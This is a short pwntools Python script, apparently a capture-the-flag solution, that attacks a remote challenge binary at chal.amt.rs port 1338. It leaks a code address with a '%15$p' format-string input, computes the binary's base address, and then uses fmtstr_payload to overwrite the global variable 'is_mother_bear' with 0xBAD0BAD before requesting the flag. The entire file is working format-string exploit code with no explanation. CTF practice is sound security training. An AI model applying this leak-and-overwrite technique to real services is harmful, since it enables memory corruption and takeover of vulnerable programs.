from pwn import *
context.binary = e = ELF('./chal')
context.log_level = 'debug'
#r = process('./chal')
r = remote('chal.amt.rs', 1338)
r.recvuntil(b':')
r.sendline(b'%15$p')
r.recvuntil(b'* ')
#r.interactive()
pie_leak = int(r.recvuntil(b' '), 16)
#e.address = pie_leak - 0x52a0 
e.address = pie_leak - 0x1678
print('binary @', hex(e.address))
payload = fmtstr_payload(22, {e.sym['is_mother_bear']: 0xBAD0BAD})
r.recvuntil(b':')
r.sendline(payload)
r.recvuntil(b':')
r.sendline(b'flag')
r.interactive()


